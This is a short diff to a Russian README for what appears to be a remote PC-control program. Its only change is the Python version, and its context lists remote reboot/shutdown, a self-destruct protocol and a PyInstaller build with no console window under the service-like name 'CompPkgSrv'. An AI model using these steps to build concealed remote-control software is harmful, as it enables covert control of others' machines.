@@ -18,7 +18,7 @@
 - 🛑 **Управление:** Дистанционная перезагрузка/выключение ПК и полный протокол самоуничтожения.
 
 ### Инструкция по сборке:
-1. Установите Python и библиотеки: `pip install -r requirements.txt`
+1. Установите Python 3.13 и библиотеки: `pip install -r requirements.txt`
 2. Вставьте свой `TOKEN` и `MY_ID` в код `main.py`.
 3. Соберите проект в папку (рекомендуется для стабильности):
    `pyinstaller --noconsole --onedir --icon=NONE --collect-all moviepy --copy-metadata imageio --copy-metadata moviepy --copy-metadata imageio_ffmpeg --name="CompPkgSrv" main.py`
